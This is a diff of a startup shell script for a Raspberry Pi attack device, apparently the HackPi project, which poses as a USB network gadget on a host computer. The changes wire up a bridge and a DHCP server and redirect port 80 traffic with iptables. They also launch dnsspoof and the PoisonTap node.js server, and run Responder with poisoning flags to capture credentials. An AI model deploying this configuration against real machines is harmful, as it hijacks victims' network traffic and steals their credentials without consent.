@@ -18,23 +18,37 @@ if [ "$_IP" ]; then
 fi
 
 # Parse USB requests in dmesg
-/bin/bash /home/pi/umap/usbreq.sh | tee /home/pi/os.txt
+/bin/bash /home/pi/HackPi/fingerprint.sh | tee /home/pi/os.txt
 
 # Stop the dummy gadget and start the real one
 modprobe -r g_ether
 modprobe libcomposite
 
 # libcomposite configuration
-/bin/sh /home/pi/poisontap/pi_startup.sh | tee /home/pi/poisontap/pi_startup.log
+/bin/sh /home/pi/HackPi/gadget.sh | tee /home/pi/HackPi/gadget.log
+
+# Start bridge interface
+ifup br0
+ifconfig br0 up
 
 # Clear leases
 #rm -f /var/lib/dhcp/dhcpd.leases
 #touch /var/lib/dhcp/dhcpd.leases
 
-# Start DHCP server
-#/usr/sbin/dhcpd
+# Start the DHCP server
+/sbin/route add -net 0.0.0.0/0 br0
+/etc/init.d/isc-dhcp-server start
+# Set some other paramaters
+#/sbin/sysctl -w net.ipv4.ip_forward=1
+/sbin/iptables -t nat -A PREROUTING -i br0 -p tcp --dport 80 -j REDIRECT --to-port 1337
+# Start some servers
+/usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i br0 port 53
+/usr/bin/screen -dmS node /usr/bin/nodejs /home/pi/poisontap/pi_poisontap.js 
+
+# Enable Serial
+systemctl enable getty@ttyGS0.service
 
 # Start Responder
-/usr/bin/screen -dmS responder bash -c 'cd /home/pi/Responder/; python Responder.py -I br0 -f -w -r -d -F' | tee /home/pi/Responder.log
+/usr/bin/screen -dmS responder bash -c 'cd /home/pi/Responder/; python Responder.py -I br0 -f -w -r -d -F'
 
 exit 0
